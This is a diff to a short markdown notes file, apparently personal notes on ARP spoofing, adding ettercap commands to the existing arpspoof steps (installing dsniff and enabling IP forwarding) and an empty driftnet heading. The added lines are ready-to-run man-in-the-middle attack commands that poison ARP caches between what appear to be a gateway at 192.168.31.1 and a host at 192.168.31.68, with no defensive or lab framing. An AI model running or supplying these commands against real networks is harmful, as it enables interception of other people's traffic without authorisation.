@@ -1,4 +1,6 @@
-# arp spoofing
+# arp
+
+## arpspoof
 1. install
 ```shell
 apt install dsniff
@@ -12,3 +14,13 @@ echo 1 >/proc/sys/net/ipv4/ip_forward
 ```shell
 sudo sysctl -a | grep forward
 ```
+
+## ettercap
+```shell
+# arp spoof
+sudo ettercap -T -M arp /192.168.31.1// /192.168.31.68//
+#
+sudo ettercap -T -M arp:remote /192.168.31.1// /192.168.31.68//
+```
+
+## driftnet
